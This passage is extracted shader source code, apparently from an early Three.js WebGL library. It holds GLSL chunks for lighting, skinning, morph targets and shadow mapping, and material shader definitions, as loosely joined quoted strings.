vec3 emissive;""uniform vec3 ambientLightColor;""#if MAX_DIR_LIGHTS > 0""	uniform vec3 directionalLightColor[ MAX_DIR_LIGHTS ];""	uniform vec3 directionalLightDirection[ MAX_DIR_LIGHTS ];""#if MAX_HEMI_LIGHTS > 0""	uniform vec3 hemisphereLightSkyColor[ MAX_HEMI_LIGHTS ];""	uniform vec3 hemisphereLightGroundColor[ MAX_HEMI_LIGHTS ];""	uniform vec3 hemisphereLightDirection[ MAX_HEMI_LIGHTS ];""#if MAX_POINT_LIGHTS > 0""	uniform vec3 pointLightColor[ MAX_POINT_LIGHTS ];""	uniform vec3 pointLightPosition[ MAX_POINT_LIGHTS ];""	uniform float pointLightDistance[ MAX_POINT_LIGHTS ];""#if MAX_SPOT_LIGHTS > 0""	uniform vec3 spotLightColor[ MAX_SPOT_LIGHTS ];""	uniform vec3 spotLightPosition[ MAX_SPOT_LIGHTS ];""	uniform vec3 spotLightDirection[ MAX_SPOT_LIGHTS ];""	uniform float spotLightDistance[ MAX_SPOT_LIGHTS ];""	uniform float spotLightAngleCos[ MAX_SPOT_LIGHTS ];""	uniform float spotLightExponent[ MAX_SPOT_LIGHTS ];""#ifdef WRAP_AROUND""	uniform vec3 wrapRGB;"lights_lambert_vertex"vLightFront = vec3( 0.0 );""#ifdef DOUBLE_SIDED""	vLightBack = vec3( 0.0 );""transformedNormal = normalize( transformedNormal );""for( int i = 0; i < MAX_DIR_LIGHTS; i ++ ) {""	vec4 lDirection = viewMatrix * vec4( directionalLightDirection[ i ], 0.0 );""	vec3 dirVector = normalize( lDirection.xyz );""	float dotProduct = dot( transformedNormal, dirVector );""	vec3 directionalLightWeighting = vec3( max( dotProduct, 0.0 ) );""		vec3 directionalLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );""		#ifdef WRAP_AROUND""			vec3 directionalLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );""		#endif""	#ifdef WRAP_AROUND""		vec3 directionalLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );""		directionalLightWeighting = mix( directionalLightWeighting, directionalLightWeightingHalf, wrapRGB );""		#ifdef DOUBLE_SIDED""			directionalLightWeightingBack = mix( directionalLightWeightingBack, directionalLightWeightingHalfBack, wrapRGB );""	vLightFront += directionalLightColor[ i ] * directionalLightWeighting;""		vLightBack += directionalLightColor[ i ] * directionalLightWeightingBack;""	for( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {""		vec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );""		vec3 lVector = lPosition.xyz - mvPosition.xyz;""		float lDistance = 1.0;""		if ( pointLightDistance[ i ] > 0.0 )""			lDistance = 1.0 - min( ( length( lVector ) / pointLightDistance[ i ] ), 1.0 );""		lVector = normalize( lVector );""		float dotProduct = dot( transformedNormal, lVector );""		vec3 pointLightWeighting = vec3( max( dotProduct, 0.0 ) );""			vec3 pointLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );""			#ifdef WRAP_AROUND""				vec3 pointLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );""			#endif""			vec3 pointLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );""			pointLightWeighting = mix( pointLightWeighting, pointLightWeightingHalf, wrapRGB );""			#ifdef DOUBLE_SIDED""				pointLightWeightingBack = mix( pointLightWeightingBack, pointLightWeightingHalfBack, wrapRGB );""		vLightFront += pointLightColor[ i ] * pointLightWeighting * lDistance;""			vLightBack += pointLightColor[ i ] * pointLightWeightingBack * lDistance;""	for( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {""		vec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );""		float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - worldPosition.xyz ) );""		if ( spotEffect > spotLightAngleCos[ i ] ) {""			spotEffect = max( pow( spotEffect, spotLightExponent[ i ] ), 0.0 );""			float lDistance = 1.0;""			if ( spotLightDistance[ i ] > 0.0 )""				lDistance = 1.0 - min( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 );""			lVector = normalize( lVector );""			float dotProduct = dot( transformedNormal, lVector );""			vec3 spotLightWeighting = vec3( max( dotProduct, 0.0 ) );""				vec3 spotLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );""				#ifdef WRAP_AROUND""					vec3 spotLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );""				#endif""				vec3 spotLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );""				spotLightWeighting = mix( spotLightWeighting, spotLightWeightingHalf, wrapRGB );""				#ifdef DOUBLE_SIDED""					spotLightWeightingBack = mix( spotLightWeightingBack, spotLightWeightingHalfBack, wrapRGB );""			vLightFront += spotLightColor[ i ] * spotLightWeighting * lDistance * spotEffect;""				vLightBack += spotLightColor[ i ] * spotLightWeightingBack * lDistance * spotEffect;""	for( int i = 0; i < MAX_HEMI_LIGHTS; i ++ ) {""		vec4 lDirection = viewMatrix * vec4( hemisphereLightDirection[ i ], 0.0 );""		vec3 lVector = normalize( lDirection.xyz );""		float hemiDiffuseWeight = 0.5 * dotProduct + 0.5;""		float hemiDiffuseWeightBack = -0.5 * dotProduct + 0.5;""		vLightFront += mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );""			vLightBack += mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeightBack );""vLightFront = vLightFront * diffuse + ambient * ambientLightColor + emissive;""	vLightBack = vLightBack * diffuse + ambient * ambientLightColor + emissive;"lights_phong_pars_vertex"#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP ) || defined( USE_ENVMAP )""	varying vec3 vWorldPosition;"lights_phong_vertex"	vWorldPosition = worldPosition.xyz;"lights_phong_pars_fragment"varying vec3 vViewPosition;""varying vec3 vNormal;"lights_phong_fragment"vec3 normal = normalize( vNormal );""vec3 viewPosition = normalize( vViewPosition );""	normal = normal * ( -1.0 + 2.0 * float( gl_FrontFacing ) );""	normal = perturbNormal2Arb( -vViewPosition, normal );""#elif defined( USE_BUMPMAP )""	normal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );""	vec3 pointDiffuse  = vec3( 0.0 );""	vec3 pointSpecular = vec3( 0.0 );""	for ( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {""		vec3 lVector = lPosition.xyz + vViewPosition.xyz;""		float dotProduct = dot( normal, lVector );""			float pointDiffuseWeightFull = max( dotProduct, 0.0 );""			float pointDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );""			vec3 pointDiffuseWeight = mix( vec3( pointDiffuseWeightFull ), vec3( pointDiffuseWeightHalf ), wrapRGB );""		#else""			float pointDiffuseWeight = max( dotProduct, 0.0 );""		pointDiffuse  += diffuse * pointLightColor[ i ] * pointDiffuseWeight * lDistance;""		vec3 pointHalfVector = normalize( lVector + viewPosition );""		float pointDotNormalHalf = max( dot( normal, pointHalfVector ), 0.0 );""		float pointSpecularWeight = specularStrength * max( pow( pointDotNormalHalf, shininess ), 0.0 );""		float specularNormalization = ( shininess + 2.0001 ) / 8.0;""		vec3 schlick = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVector, pointHalfVector ), 0.0 ), 5.0 );""		pointSpecular += schlick * pointLightColor[ i ] * pointSpecularWeight * pointDiffuseWeight * lDistance * specularNormalization;""	vec3 spotDiffuse  = vec3( 0.0 );""	vec3 spotSpecular = vec3( 0.0 );""	for ( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {""		if ( spotLightDistance[ i ] > 0.0 )""			lDistance = 1.0 - min( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 );""		float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - vWorldPosition ) );""			float dotProduct = dot( normal, lVector );""				float spotDiffuseWeightFull = max( dotProduct, 0.0 );""				float spotDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );""				vec3 spotDiffuseWeight = mix( vec3( spotDiffuseWeightFull ), vec3( spotDiffuseWeightHalf ), wrapRGB );""			#else""				float spotDiffuseWeight = max( dotProduct, 0.0 );""			spotDiffuse += diffuse * spotLightColor[ i ] * spotDiffuseWeight * lDistance * spotEffect;""			vec3 spotHalfVector = normalize( lVector + viewPosition );""			float spotDotNormalHalf = max( dot( normal, spotHalfVector ), 0.0 );""			float spotSpecularWeight = specularStrength * max( pow( spotDotNormalHalf, shininess ), 0.0 );""			float specularNormalization = ( shininess + 2.0001 ) / 8.0;""			vec3 schlick = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVector, spotHalfVector ), 0.0 ), 5.0 );""			spotSpecular += schlick * spotLightColor[ i ] * spotSpecularWeight * spotDiffuseWeight * lDistance * specularNormalization * spotEffect;""	vec3 dirDiffuse  = vec3( 0.0 );""	vec3 dirSpecular = vec3( 0.0 );""	for( int i = 0; i < MAX_DIR_LIGHTS; i ++ ) {""		vec4 lDirection = viewMatrix * vec4( directionalLightDirection[ i ], 0.0 );""		vec3 dirVector = normalize( lDirection.xyz );""		float dotProduct = dot( normal, dirVector );""			float dirDiffuseWeightFull = max( dotProduct, 0.0 );""			float dirDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );""			vec3 dirDiffuseWeight = mix( vec3( dirDiffuseWeightFull ), vec3( dirDiffuseWeightHalf ), wrapRGB );""			float dirDiffuseWeight = max( dotProduct, 0.0 );""		dirDiffuse  += diffuse * directionalLightColor[ i ] * dirDiffuseWeight;""		vec3 dirHalfVector = normalize( dirVector + viewPosition );""		float dirDotNormalHalf = max( dot( normal, dirHalfVector ), 0.0 );""		float dirSpecularWeight = specularStrength * max( pow( dirDotNormalHalf, shininess ), 0.0 );""		vec3 schlick = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( dirVector, dirHalfVector ), 0.0 ), 5.0 );""		dirSpecular += schlick * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight * specularNormalization;""	vec3 hemiDiffuse  = vec3( 0.0 );""	vec3 hemiSpecular = vec3( 0.0 );""		vec3 hemiColor = mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );""		hemiDiffuse += diffuse * hemiColor;""		vec3 hemiHalfVectorSky = normalize( lVector + viewPosition );""		float hemiDotNormalHalfSky = 0.5 * dot( normal, hemiHalfVectorSky ) + 0.5;""		float hemiSpecularWeightSky = specularStrength * max( pow( hemiDotNormalHalfSky, shininess ), 0.0 );""		vec3 lVectorGround = -lVector;""		vec3 hemiHalfVectorGround = normalize( lVectorGround + viewPosition );""		float hemiDotNormalHalfGround = 0.5 * dot( normal, hemiHalfVectorGround ) + 0.5;""		float hemiSpecularWeightGround = specularStrength * max( pow( hemiDotNormalHalfGround, shininess ), 0.0 );""		float dotProductGround = dot( normal, lVectorGround );""		vec3 schlickSky = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVector, hemiHalfVectorSky ), 0.0 ), 5.0 );""		vec3 schlickGround = specular + vec3( 1.0 - specular ) * pow( max( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 0.0 ), 5.0 );""		hemiSpecular += hemiColor * specularNormalization * ( schlickSky * hemiSpecularWeightSky * max( dotProduct, 0.0 ) + schlickGround * hemiSpecularWeightGround * max( dotProductGround, 0.0 ) );""vec3 totalDiffuse = vec3( 0.0 );""vec3 totalSpecular = vec3( 0.0 );""	totalDiffuse += dirDiffuse;""	totalSpecular += dirSpecular;""	totalDiffuse += hemiDiffuse;""	totalSpecular += hemiSpecular;""	totalDiffuse += pointDiffuse;""	totalSpecular += pointSpecular;""	totalDiffuse += spotDiffuse;""	totalSpecular += spotSpecular;""#ifdef METAL""	gl_FragColor.xyz = gl_FragColor.xyz * ( emissive + totalDiffuse + ambientLightColor * ambient + totalSpecular );""	gl_FragColor.xyz = gl_FragColor.xyz * ( emissive + totalDiffuse + ambientLightColor * ambient ) + totalSpecular;"color_pars_fragment"#ifdef USE_COLOR""	varying vec3 vColor;"color_fragment"	gl_FragColor = gl_FragColor * vec4( vColor, 1.0 );"color_pars_vertexcolor_vertex"		vColor = color * color;""		vColor = color;"skinning_pars_vertex"#ifdef USE_SKINNING""	#ifdef BONE_TEXTURE""		uniform sampler2D boneTexture;""		uniform int boneTextureWidth;""		uniform int boneTextureHeight;""		mat4 getBoneMatrix( const in float i ) {""			float j = i * 4.0;""			float x = mod( j, float( boneTextureWidth ) );""			float y = floor( j / float( boneTextureWidth ) );""			float dx = 1.0 / float( boneTextureWidth );""			float dy = 1.0 / float( boneTextureHeight );""			y = dy * ( y + 0.5 );""			vec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );""			vec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );""			vec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );""			vec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );""			mat4 bone = mat4( v1, v2, v3, v4 );""			return bone;""		uniform mat4 boneGlobalMatrices[ MAX_BONES ];""			mat4 bone = boneGlobalMatrices[ int(i) ];"skinbase_vertex"	mat4 boneMatX = getBoneMatrix( skinIndex.x );""	mat4 boneMatY = getBoneMatrix( skinIndex.y );""	mat4 boneMatZ = getBoneMatrix( skinIndex.z );""	mat4 boneMatW = getBoneMatrix( skinIndex.w );"skinning_vertex"	#ifdef USE_MORPHTARGETS""	vec4 skinVertex = vec4( morphed, 1.0 );""	vec4 skinVertex = vec4( position, 1.0 );""	vec4 skinned  = boneMatX * skinVertex * skinWeight.x;""	skinned      += boneMatY * skinVertex * skinWeight.y;""	skinned      += boneMatZ * skinVertex * skinWeight.z;""	skinned      += boneMatW * skinVertex * skinWeight.w;"morphtarget_pars_vertex"#ifdef USE_MORPHTARGETS""	#ifndef USE_MORPHNORMALS""	uniform float morphTargetInfluences[ 8 ];""	uniform float morphTargetInfluences[ 4 ];"morphtarget_vertex"	vec3 morphed = vec3( 0.0 );""	morphed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];""	morphed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];""	morphed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];""	morphed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];""	morphed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];""	morphed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];""	morphed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];""	morphed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];""	morphed += position;"default_vertex"vec4 mvPosition;""	mvPosition = modelViewMatrix * skinned;""#if !defined( USE_SKINNING ) && defined( USE_MORPHTARGETS )""	mvPosition = modelViewMatrix * vec4( morphed, 1.0 );""#if !defined( USE_SKINNING ) && ! defined( USE_MORPHTARGETS )""	mvPosition = modelViewMatrix * vec4( position, 1.0 );""gl_Position = projectionMatrix * mvPosition;"morphnormal_vertex"#ifdef USE_MORPHNORMALS""	vec3 morphedNormal = vec3( 0.0 );""	morphedNormal +=  ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];""	morphedNormal +=  ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];""	morphedNormal +=  ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];""	morphedNormal +=  ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];""	morphedNormal += normal;"skinnormal_vertex"	mat4 skinMatrix = skinWeight.x * boneMatX;""	skinMatrix 	+= skinWeight.y * boneMatY;""	skinMatrix 	+= skinWeight.z * boneMatZ;""	skinMatrix 	+= skinWeight.w * boneMatW;""	#ifdef USE_MORPHNORMALS""	vec4 skinnedNormal = skinMatrix * vec4( morphedNormal, 0.0 );""	vec4 skinnedNormal = skinMatrix * vec4( normal, 0.0 );"defaultnormal_vertex"vec3 objectNormal;""	objectNormal = skinnedNormal.xyz;""#if !defined( USE_SKINNING ) && defined( USE_MORPHNORMALS )""	objectNormal = morphedNormal;""#if !defined( USE_SKINNING ) && ! defined( USE_MORPHNORMALS )""	objectNormal = normal;""#ifdef FLIP_SIDED""	objectNormal = -objectNormal;""vec3 transformedNormal = normalMatrix * objectNormal;"shadowmap_pars_fragment"#ifdef USE_SHADOWMAP""	uniform sampler2D shadowMap[ MAX_SHADOWS ];""	uniform vec2 shadowMapSize[ MAX_SHADOWS ];""	uniform float shadowDarkness[ MAX_SHADOWS ];""	uniform float shadowBias[ MAX_SHADOWS ];""	varying vec4 vShadowCoord[ MAX_SHADOWS ];""	float unpackDepth( const in vec4 rgba_depth ) {""		const vec4 bit_shift = vec4( 1.0 / ( 256.0 * 256.0 * 256.0 ), 1.0 / ( 256.0 * 256.0 ), 1.0 / 256.0, 1.0 );""		float depth = dot( rgba_depth, bit_shift );""		return depth;"shadowmap_fragment"	#ifdef SHADOWMAP_DEBUG""		vec3 frustumColors[3];""		frustumColors[0] = vec3( 1.0, 0.5, 0.0 );""		frustumColors[1] = vec3( 0.0, 1.0, 0.8 );""		frustumColors[2] = vec3( 0.0, 0.5, 1.0 );""	#ifdef SHADOWMAP_CASCADE""		int inFrustumCount = 0;""	float fDepth;""	vec3 shadowColor = vec3( 1.0 );""	for( int i = 0; i < MAX_SHADOWS; i ++ ) {""		vec3 shadowCoord = vShadowCoord[ i ].xyz / vShadowCoord[ i ].w;""		bvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );""		bool inFrustum = all( inFrustumVec );""		#ifdef SHADOWMAP_CASCADE""			inFrustumCount += int( inFrustum );""			bvec3 frustumTestVec = bvec3( inFrustum, inFrustumCount == 1, shadowCoord.z <= 1.0 );""			bvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );""		bool frustumTest = all( frustumTestVec );""		if ( frustumTest ) {""			shadowCoord.z += shadowBias[ i ];""			#if defined( SHADOWMAP_TYPE_PCF )""				float shadow = 0.0;""				const float shadowDelta = 1.0 / 9.0;""				float xPixelOffset = 1.0 / shadowMapSize[ i ].x;""				float yPixelOffset = 1.0 / shadowMapSize[ i ].y;""				float dx0 = -1.25 * xPixelOffset;""				float dy0 = -1.25 * yPixelOffset;""				float dx1 = 1.25 * xPixelOffset;""				float dy1 = 1.25 * yPixelOffset;""				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) );""				if ( fDepth < shadowCoord.z ) shadow += shadowDelta;""				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) );""				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) );""				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) );""				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy ) );""				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) );""				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) );""				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) );""				fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) );""				shadowColor = shadowColor * vec3( ( 1.0 - shadowDarkness[ i ] * shadow ) );""			#elif defined( SHADOWMAP_TYPE_PCF_SOFT )""				float dx0 = -1.0 * xPixelOffset;""				float dy0 = -1.0 * yPixelOffset;""				float dx1 = 1.0 * xPixelOffset;""				float dy1 = 1.0 * yPixelOffset;""				mat3 shadowKernel;""				mat3 depthKernel;""				depthKernel[0][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) );""				depthKernel[0][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) );""				depthKernel[0][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) );""				depthKernel[1][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) );""				depthKernel[1][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy ) );""				depthKernel[1][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) );""				depthKernel[2][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) );""				depthKernel[2][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) );""				depthKernel[2][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) );""				vec3 shadowZ = vec3( shadowCoord.z );""				shadowKernel[0] = vec3(lessThan(depthKernel[0], shadowZ ));""				shadowKernel[0] *= vec3(0.25);""				shadowKernel[1] = vec3(lessThan(depthKernel[1], shadowZ ));""				shadowKernel[1] *= vec3(0.25);""				shadowKernel[2] = vec3(lessThan(depthKernel[2], shadowZ ));""				shadowKernel[2] *= vec3(0.25);""				vec2 fractionalCoord = 1.0 - fract( shadowCoord.xy * shadowMapSize[i].xy );""				shadowKernel[0] = mix( shadowKernel[1], shadowKernel[0], fractionalCoord.x );""				shadowKernel[1] = mix( shadowKernel[2], shadowKernel[1], fractionalCoord.x );""				vec4 shadowValues;""				shadowValues.x = mix( shadowKernel[0][1], shadowKernel[0][0], fractionalCoord.y );""				shadowValues.y = mix( shadowKernel[0][2], shadowKernel[0][1], fractionalCoord.y );""				shadowValues.z = mix( shadowKernel[1][1], shadowKernel[1][0], fractionalCoord.y );""				shadowValues.w = mix( shadowKernel[1][2], shadowKernel[1][1], fractionalCoord.y );""				shadow = dot( shadowValues, vec4( 1.0 ) );""				vec4 rgbaDepth = texture2D( shadowMap[ i ], shadowCoord.xy );""				float fDepth = unpackDepth( rgbaDepth );""				if ( fDepth < shadowCoord.z )""					shadowColor = shadowColor * vec3( 1.0 - shadowDarkness[ i ] );""		#ifdef SHADOWMAP_DEBUG""			#ifdef SHADOWMAP_CASCADE""				if ( inFrustum && inFrustumCount == 1 ) gl_FragColor.xyz *= frustumColors[ i ];""				if ( inFrustum ) gl_FragColor.xyz *= frustumColors[ i ];""	#ifdef GAMMA_OUTPUT""		shadowColor *= shadowColor;""	gl_FragColor.xyz = gl_FragColor.xyz * shadowColor;"shadowmap_pars_vertex"	uniform mat4 shadowMatrix[ MAX_SHADOWS ];"shadowmap_vertex"		vShadowCoord[ i ] = shadowMatrix[ i ] * worldPosition;"alphatest_fragment"#ifdef ALPHATEST""	if ( gl_FragColor.a < ALPHATEST ) discard;"linear_to_gamma_fragment"#ifdef GAMMA_OUTPUT""	gl_FragColor.xyz = sqrt( gl_FragColor.xyz );"logdepthbuf_pars_vertex"#ifdef USE_LOGDEPTHBUF""		varying float vFragDepth;""	uniform float logDepthBufFC;"logdepthbuf_vertex"	gl_Position.z = log2(max(1e-6, gl_Position.w + 1.0)) * logDepthBufFC;""		vFragDepth = 1.0 + gl_Position.w;""		gl_Position.z = (gl_Position.z - 1.0) * gl_Position.w;"logdepthbuf_pars_fragment"		#extension GL_EXT_frag_depth : enable"logdepthbuf_fragment"#if defined(USE_LOGDEPTHBUF) && defined(USE_LOGDEPTHBUF_EXT)""	gl_FragDepthEXT = log2(vFragDepth) * logDepthBufFC * 0.5;"mergeduniforms_srcparameterparameter_srcuniforms_dstUniformsLibcommon"c""offsetRepeat""v4""flipEnvMap""useRefract""i""refractionRatio""morphTargetInfluences"bump"bumpScale"normalmap"normalScale""v2""fogDensity""fogNear""fogFar""fogColor""ambientLightColor""fv""directionalLightDirection""directionalLightColor""hemisphereLightDirection""hemisphereLightSkyColor""hemisphereLightGroundColor""pointLightColor""pointLightPosition""pointLightDistance""fv1""spotLightColor""spotLightPosition""spotLightDirection""spotLightDistance""spotLightAngleCos""spotLightExponent"particle"psColor""size"shadowmap"shadowMap""tv""shadowMapSize""v2v""shadowBias""shadowDarkness""shadowMatrix""m4v"'basic'"common""fog""shadowmap""map_pars_vertex""lightmap_pars_vertex""envmap_pars_vertex""color_pars_vertex""morphtarget_pars_vertex""skinning_pars_vertex""shadowmap_pars_vertex""logdepthbuf_pars_vertex""map_vertex""lightmap_vertex""color_vertex""skinbase_vertex""	#ifdef USE_ENVMAP""morphnormal_vertex""skinnormal_vertex""defaultnormal_vertex""morphtarget_vertex""skinning_vertex""default_vertex""logdepthbuf_vertex""worldpos_vertex""envmap_vertex""shadowmap_vertex""color_pars_fragment""map_pars_fragment""lightmap_pars_fragment""envmap_pars_fragment""fog_pars_fragment""shadowmap_pars_fragment""specularmap_pars_fragment""logdepthbuf_pars_fragment""	gl_FragColor = vec4( diffuse, opacity );""logdepthbuf_fragment""map_fragment""alphatest_fragment""specularmap_fragment""lightmap_fragment""color_fragment""envmap_fragment""shadowmap_fragment""linear_to_gamma_fragment""fog_fragment"'lambert'"lights""emissive""v3""#define LAMBERT""varying vec3 vLightFront;""	varying vec3 vLightBack;""lights_lambert_pars_vertex""lights_lambert_vertex""	gl_FragColor = vec4( vec3( 1.0 ), opacity );""		if ( gl_FrontFacing )""			gl_FragColor.xyz *= vLightFront;""		else""			gl_FragColor.xyz *= vLightBack;""		gl_FragColor.xyz *= vLightFront;"'phong'"bump""#define PHONG""lights_phong_pars_vertex""	vNormal = normalize( transformedNormal );""	vViewPosition = -mvPosition.xyz;""lights_phong_vertex""uniform vec3 specular;""uniform float shininess;""lights_phong_pars_fragment""bumpmap_pars_fragment""normalmap_pars_fragment""lights_phong_fragment"'particle_basic'"particle""uniform float size;""uniform float scale;""	vec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );""	#ifdef USE_SIZEATTENUATION""		gl_PointSize = size * ( scale / length( mvPosition.xyz ) );""		gl_PointSize = size;""	gl_Position = projectionMatrix * mvPosition;""uniform vec3 psColor;""map_particle_pars_fragment""	gl_FragColor = vec4( psColor, opacity );""map_particle_fragment"'dashed'"dashSize""totalSize""attribute float lineDistance;""varying float vLineDistance;""	vLineDistance = scale * lineDistance;""uniform float dashSize;""uniform float totalSize;""	if ( mod( vLineDistance, totalSize ) > dashSize ) {""		discard;"'depth'"mNear""mFar"2000.0"uniform float mNear;""uniform float mFar;""	float color = 1.0 - smoothstep( mNear, mFar, depth );""	gl_FragColor = vec4( vec3( color ), opacity );"'normal'"	vNormal = normalize( normalMatrix * normal );""	gl_FragColor = vec4( 0.5 * normalize( vNormal ) + 0.5, opacity );"'normalmap'"uOffset""uRepeat""uniform bool enableDiffuse;""uniform bool enableSpecular;""uniform bool enableAO;""uniform bool enableReflection;""uniform sampler2D tNormal;""uniform sampler2D tSpecular;""uniform sampler2D tAO;""uniform samplerCube tCube;""uniform vec2 uNormalScale;""uniform bool useRefract;""uniform float refractionRatio;""uniform float reflectivity;""varying vec3 vTangent;""varying vec3 vBinormal;""varying vec3 vWorldPosition;""	vec3 specularTex = vec3( 1.0 );""	vec3 normalTex = texture2D( tNormal, vUv ).xyz * 2.0 - 1.0;""	normalTex.xy *= uNormalScale;""	normalTex = normalize( normalTex );""	if( enableDiffuse ) {""		#ifdef GAMMA_INPUT""			vec4 texelColor = texture2D( tDiffuse, vUv );""			texelColor.xyz *= texelColor.xyz;""			gl_FragColor = gl_FragColor * texelColor;""			gl_FragColor = gl_FragColor * texture2D( tDiffuse, vUv );""	if( enableAO ) {""			vec4 aoColor = texture2D( tAO, vUv );""			aoColor.xyz *= aoColor.xyz;""			gl_FragColor.xyz = gl_FragColor.xyz * aoColor.xyz;""			gl_FragColor.xyz = gl_FragColor.xyz * texture2D( tAO, vUv ).xyz;""	if( enableSpecular )""		specularTex = texture2D( tSpecular, vUv ).xyz;""	mat3 tsb = mat3( normalize( vTangent ), normalize( vBinormal ), normalize( vNormal ) );""	vec3 finalNormal = tsb * normalTex;""	#ifdef FLIP_SIDED""		finalNormal = -finalNormal;""	vec3 normal = normalize( finalNormal );""	vec3 viewPosition = normalize( vViewPosition );""	#if MAX_POINT_LIGHTS > 0""		vec3 pointDiffuse = vec3( 0.0 );""		vec3 pointSpecular = vec3( 0.0 );""		for ( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {""			vec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );""			vec3 pointVector = lPosition.xyz + vViewPosition.xyz;""			float pointDistance = 1.0;""			if ( pointLightDistance[ i ] > 0.0 )""				pointDistance = 1.0 - min( ( length( pointVector ) / pointLightDistance[ i ] ), 1.0 );""			pointVector = normalize( pointVector );""				float pointDiffuseWeightFull = max( dot( normal, pointVector ), 0.0 );""				float pointDiffuseWeightHalf = max( 0.5 * dot( normal, pointVector ) + 0.5, 0.0 );""				vec3 pointDiffuseWeight = mix( vec3( pointDiffuseWeightFull ), vec3( pointDiffuseWeightHalf ), wrapRGB );""				float pointDiffuseWeight = max( dot( normal, pointVector ), 0.0 );""			pointDiffuse += pointDistance * pointLightColor[ i ] * diffuse * pointDiffuseWeight;""			vec3 pointHalfVector = normalize( pointVector + viewPosition );""			float pointDotNormalHalf = max( dot( normal, pointHalfVector ), 0.0 );""			float pointSpecularWeight = specularTex.r * max( pow( pointDotNormalHalf, shininess ), 0.0 );""			vec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( pointVector, pointHalfVector ), 5.0 );""			pointSpecular += schlick * pointLightColor[ i ] * 